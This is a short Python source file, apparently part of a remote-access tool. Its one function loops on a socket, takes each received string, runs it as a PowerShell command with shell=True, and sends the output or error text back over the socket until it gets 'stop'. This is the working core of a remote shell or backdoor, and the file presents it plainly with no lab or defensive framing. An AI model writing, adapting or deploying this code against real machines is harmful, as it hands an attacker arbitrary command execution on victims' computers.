import subprocess

def executecommand(my_socket):
    print('executing command')
    while True:
        user_command=my_socket.recv_data()
        print(user_command)        
        if user_command=="stop":
            break
        if user_command=="":
            continue
        output=subprocess.run(["powershell",user_command],shell=True,capture_output=True)
        if output.stderr.decode('utf-8')=="":
            cmd_result=output.stdout.decode('utf-8')
        else:
            cmd_result=output.stderr.decode('utf-8')    
        print(user_command)
        my_socket.send_command_result(cmd_result)


